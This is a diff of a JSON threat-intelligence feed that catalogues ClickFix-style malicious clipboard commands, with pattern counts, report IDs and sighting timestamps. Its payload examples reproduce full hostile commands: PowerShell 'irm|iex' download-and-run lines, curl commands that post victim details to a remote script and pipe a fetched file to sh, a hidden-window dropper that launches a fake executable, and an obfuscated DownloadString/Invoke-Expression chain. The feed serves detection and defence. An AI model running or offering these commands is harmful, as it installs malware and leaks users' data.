@@ -3,10 +3,9 @@
     "Pattern": "irm '<URL>'|iex;",
     "DistinctPayloadCount": 151,
     "ReportCount": 151,
-    "FirstSeen": "2026-11-13T05:20:26.050000+00:00",
-    "LastSeen": "2026-11-19T23:26:13.464000+00:00",
+    "FirstSeen": "2026-11-13T12:11:13.497000+00:00",
+    "LastSeen": "2026-11-20T05:30:54.841000+00:00",
     "ReportIds": [
-      "cmwej31qk0cf00omlfkkf1xkc",
       "cmwexrbu80epn0omlnpgz1hnh",
       "cmwey02zr0eyu0omlwwzxamhx",
       "cmwey0zxj0f220omls520xd1u",
@@ -156,7 +155,8 @@
       "cmwnii4tr1wvc0oml2fy1ka38",
       "cmwnwrsgu1xi10omlj9jbvrk0",
       "cmwo69tad1xsb0omltg23i5hb",
-      "cmwo6iht31y350omldf1s1y9c"
+      "cmwo6iht31y350omldf1s1y9c",
+      "cmwojjhkd1zzs0omlsqk31zh4"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/03b93fa50e7a9f43'|iex;",
@@ -184,7 +184,6 @@
       "irm 'browse-cloud.codes/363f0a60339cdca1'|iex;",
       "irm 'browse-cloud.codes/3a41d09dfc9da7df'|iex;",
       "irm 'browse-cloud.codes/3b1e84a691f0e630'|iex;",
-      "irm 'browse-cloud.codes/3d88e2e0aa08ee9b'|iex;",
       "irm 'browse-cloud.codes/3ecc4f43c6e077c1'|iex;",
       "irm 'browse-cloud.codes/410de3376b3684a0'|iex;",
       "irm 'browse-cloud.codes/416c86d35c45adea'|iex;",
@@ -309,7 +308,8 @@
       "irm 'img-codes-cloude[.]info/4e816a63fc53eaa4'|iex;",
       "irm 'img-codes-cloude[.]info/621993c387443d46'|iex;",
       "irm 'img-codes-cloude[.]info/733cc39bf1b16194'|iex;",
-      "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;"
+      "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;",
+      "irm 'img-codes-cloude[.]info/c0fdade6bf8b0ce9'|iex;"
     ]
   },
   {
@@ -495,10 +495,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 64,
-    "ReportCount": 64,
+    "DistinctPayloadCount": 65,
+    "ReportCount": 65,
     "FirstSeen": "2026-11-13T09:28:22.206000+00:00",
-    "LastSeen": "2026-11-19T15:28:10.392000+00:00",
+    "LastSeen": "2026-11-20T05:24:19.392000+00:00",
     "ReportIds": [
       "cmwerxwap0e0d0omlo90ozon6",
       "cmwfb87f30g8x0omlp6pbqff9",
@@ -563,7 +563,8 @@
       "cmwlpi7kr1pyj0omlfmun9v6q",
       "cmwm9qkdy1sib0oml3v2ixmyu",
       "cmwmq6mn81u2e0omlnph8wtas",
-      "cmwnpfpw41x2g0oml742g5tyb"
+      "cmwnpfpw41x2g0oml742g5tyb",
+      "cmwojb0hj1znf0omlyv0jyf2b"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=02d53a6c-d6f4-4efc-ba96-cfb140983689&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fabdulwahabembroidery[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A58%3A44.911Z&lastShellAt=2026-11-15T03%3A58%3A44.911Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -623,6 +624,7 @@
       "curl -sL -d \"id=d6e95a0f-6d85-4143-a3ea-7a5e7376d2ec&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]zavorky[.]cz%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A43%3A43.306Z&lastShellAt=2026-11-16T04%3A43%3A43.306Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=d77acd3e-6d9d-41cc-a0bb-10a63d13ce81&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmathsciencedears[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A54%3A58.107Z&lastShellAt=2026-11-18T04%3A54%3A58.107Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=dfb14ce3-06a2-429f-b8d9-508020aa9832&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fevriresorts[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A01%3A55.766Z&lastShellAt=2026-11-18T05%3A01%3A55.766Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=e4d67e43-984b-4774-80b0-e50db34a1226&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fjocodumpsters[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-20T05%3A22%3A56.740Z&lastShellAt=2026-11-20T05%3A22%3A56.740Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=e549e631-9c39-4448-96db-61247189f7cc&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvisionhill[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A45%3A34.232Z&lastShellAt=2026-11-18T04%3A45%3A34.232Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=e9d2c216-7e2a-486b-bb73-7eab2d989063&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]ario-tech[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A49%3A00.955Z&lastShellAt=2026-11-18T04%3A49%3A00.955Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=eb599f90-cb91-4a47-9a75-7cf14102355f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftriplinepk[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A57%3A52.622Z&lastShellAt=2026-11-18T04%3A57%3A52.622Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -781,9 +783,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 41,
+    "ReportCount": 42,
     "FirstSeen": "2026-11-13T12:09:32.579000+00:00",
-    "LastSeen": "2026-11-19T23:20:44.145000+00:00",
+    "LastSeen": "2026-11-20T05:27:44.504000+00:00",
     "ReportIds": [
       "cmwexp5yl0eli0oml5k19n8dt",
       "cmwexpro50eni0oml5kyjd00v",
@@ -825,7 +827,8 @@
       "cmwlzw5oa1r2p0omliz6xurp7",
       "cmwm4ipde1sbg0omlmv080a4m",
       "cmwmcvfn81snn0oml5h11ww14",
-      "cmwo6bfpc1xut0omlmuild5t3"
+      "cmwo6bfpc1xut0omlmuild5t3",
+      "cmwojfeow1zt70omldtv35868"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -908,6 +911,20 @@
     ]
   },
   {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-17T16:32:43.152000+00:00",
+    "LastSeen": "2026-11-20T05:21:15.774000+00:00",
+    "ReportIds": [
+      "cmwkwv0pz1gqc0omlgxi8bnwj",
+      "cmwoj72ro1zl70omlyibpchkk"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
+    ]
+  },
+  {
     "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -974,19 +991,6 @@
     ],
     "PayloadExamples": [
       "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression"
-    ]
-  },
-  {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-17T16:32:43.152000+00:00",
-    "LastSeen": "2026-11-17T16:32:43.152000+00:00",
-    "ReportIds": [
-      "cmwkwv0pz1gqc0omlgxi8bnwj"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
